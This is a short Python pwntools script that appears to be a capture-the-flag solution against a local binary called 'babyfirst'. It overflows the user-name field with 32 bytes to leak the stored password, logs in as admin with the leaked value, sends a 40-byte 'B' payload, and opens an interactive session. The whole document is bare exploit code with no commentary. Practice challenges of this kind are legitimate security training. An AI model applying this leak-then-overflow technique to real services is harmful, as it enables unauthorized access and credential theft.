from pwn import *

p = process('./babyfirst')

def Login(user, password):
	p.sendlineafter('Your choice: ', '1')
	p.sendafter('User Name: ', user)
	p.sendlineafter('Password: ', password)

p.sendlineafter('Your choice: ', '1')
p.sendafter('User Name: ', 'A'*32)
p.sendlineafter('Your choice: ', '2')
p.recvuntil('A'*32)
password = p.recv(0x10)
success('password: {}'.format(password))

p.sendlineafter('Your choice: ', '1')
p.sendafter('User Name: ', 'admin')
p.sendafter('Password: ', password)

p.sendlineafter('Your choice: ', '2')
p.sendlineafter('Content: ', 'B'*40)
p.interactive()
